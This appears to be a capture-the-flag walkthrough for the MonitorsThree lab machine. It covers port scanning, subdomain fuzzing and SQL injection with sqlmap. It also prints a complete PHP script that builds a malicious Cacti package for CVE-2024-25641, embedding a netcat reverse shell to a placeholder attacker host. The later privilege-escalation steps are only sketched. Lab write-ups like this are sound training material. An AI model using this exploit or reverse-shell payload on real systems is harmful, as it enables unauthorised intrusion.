```bash
┌─[✗]─[aexon@parrot]─[~]
└──╼ $nmap -sCV -p- 10.10.11.30 --min-rate 1000 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2024-08-25 10:05 WIB
Warning: 10.10.11.30 giving up on port because retransmission cap hit (10).
Nmap scan report for monitorsthree.htb (10.10.11.30)
Host is up (0.11s latency).
Not shown: 33505 filtered tcp ports (no-response), 32028 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b (ECDSA)
|_  256 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: MonitorsThree - Networking Solutions
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 527.49 seconds

```

terdapat sql injection pada forgot-password


## 2. Enumerating Subdomains with FFUF

With HTTP open, I decided to enumerate subdomains using FFUF:

```bash
ffuf -w /path/to/wordlist -u http://monitorsthree.htb/ -H "Host: FUZZ.<target_ip>"
```

This helped me discover a subdomain called ‘cacti’. I added this subdomain to my `/etc/hosts` file to access it:

```bash
echo "<target_ip> cacti.monitorsthree.htb" | sudo tee -a /etc/hosts
```

## 3. Finding SQL Injection in Main Subdomain

Next, I focused on the main subdomain and found a SQL Injection vulnerability in `forgot_password.php`. I used SQLMap to automate the exploitation of this vulnerability, which took some time due to the complexity:

```bash
sqlmap -u "http://<target_ip>/forgot_password.php" // use flag --level and --risk --batch
```

After retrieving the database information, I extracted the usernames and passwords.

## 4. Exploiting Cacti RCE Vulnerability

Using the credentials obtained from SQLMap, I logged into the Cacti subdomain and discovered a Remote Code Execution (RCE) vulnerability in Cacti when importing packages (CVE-2024–25641). I followed the guidelines from [this GitHub advisory](https://github.com/Cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88) to exploit the vulnerability and gained a shell on the machine.

```php
<?php  
  
$xmldata = "<xml>  
   <files>  
       <file>  
           <name>resource/rce.php</name>  
           <data>%s</data>  
           <filesignature>%s</filesignature>  
       </file>  
   </files>  
   <publickey>%s</publickey>  
   <signature></signature>  
</xml>";  
$filedata = "<?php shell_exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc YOUR_IP YOUR_PORT >/tmp/f'); ?>";  
$keypair = openssl_pkey_new();   
$public_key = openssl_pkey_get_details($keypair)["key"];   
openssl_sign($filedata, $filesignature, $keypair, OPENSSL_ALGO_SHA256);  
$data = sprintf($xmldata, base64_encode($filedata), base64_encode($filesignature), base64_encode($public_key));  
openssl_sign($data, $signature, $keypair, OPENSSL_ALGO_SHA256);  
file_put_contents("shutup.xml", str_replace("<signature></signature>", "<signature>".base64_encode($signature)."</signature>", $data));  
system("cat shutup.xml | gzip -9 > shutup.xml.gz; rm shutup.xml");  
  
?>
```

> save rce.php and running ‘php rce.php’

http://cacti.monitorsthree.htb/cacti/resource/rce.php

## 5. Getting the User Flag

To get the user flag, I accessed the MySQL database, but first, I needed to find the credentials. After logging into MySQL, I searched for the user flag in the appropriate directory.

## 6. Obtaining the Root Flag

locate file config db : /opt/duplicati

Bypass Login Dupti:

[https://youtu.be/HBM1gtdPUMY](https://youtu.be/HBM1gtdPUMY)

Finally, to obtain the root flag, I noticed a new port was running. I used port forwarding to access this service and escalated my privileges to root, allowing me to retrieve the root flag.